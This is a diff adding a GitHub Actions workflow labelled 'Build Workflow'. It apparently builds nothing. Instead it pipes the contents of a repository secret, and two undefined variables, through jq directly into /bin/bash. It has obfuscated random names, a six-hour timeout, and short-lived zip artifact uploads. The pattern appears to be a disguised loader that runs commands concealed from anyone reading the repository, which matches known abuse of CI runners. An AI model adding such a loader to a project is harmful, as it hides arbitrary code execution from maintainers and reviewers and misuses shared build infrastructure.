@@ -1,0 +1,30 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          aqezq8: ${{ secrets.aqezq8 }}
+        run: |
+          printf '%s' "$aqezq8" | jq -r .nq3457 | /bin/bash
+          printf '%s' "$vf396" | jq -r .lqlew58054 | /bin/bash
+          echo $lzop17259 | jq -r .cl1 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: w1fNtF2k
+          path: "*.zip"
+          retention-days: 1
